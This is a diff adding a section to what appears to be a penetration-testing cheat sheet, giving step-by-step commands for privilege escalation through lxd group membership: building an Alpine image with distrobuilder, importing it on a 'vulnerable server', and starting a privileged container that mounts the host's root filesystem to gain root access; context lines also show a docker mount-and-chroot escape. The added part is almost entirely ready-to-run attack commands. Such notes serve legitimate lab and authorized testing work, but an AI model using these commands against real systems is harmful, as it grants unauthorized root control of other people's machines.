@@ -85,3 +85,62 @@ docker run -it -v /:/mnt alpine chroot /mnt
 docker run -it ubuntu bash
 ```
 - Optional: Run an ubuntu container with docker
+### lxd Group Priv Esc
+- Exploit without internet connection
+- Change to the root user
+```
+sudo su
+```
+- Install Requirements on your attack box
+```
+sudo apt update
+sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
+```
+- Clone the repo
+```
+sudo go get -d -v github.com/lxc/distrobuilder
+```
+- Make distrobuilder
+```
+cd $HOME/go/src/github.com/lxc/distrobuilder
+make
+```
+- Prepare the creation of Alpine
+```
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+```
+- Create the container
+```
+sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
+```
+-If that fails, run it adding `-o image.release=3.8` at the end
+- Errors
+- If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
+- You need to initialize lxd before using it
+```
+lxd init
+```
+- Read the options and use the defaults
+- Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
+- Add the image on the vulnerable server
+```
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list
+```
+- Second command is only if you want to confim the imported image is present
+- Create a container and add the root path
+```
+lxc init alpine privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+```
+- Execute the container
+```
+lxc start privesc
+lxc exec privesc /bin/sh
+cd /mnt/root
+```
+- `/mnt/root` is where the file system is mounted.
+
+
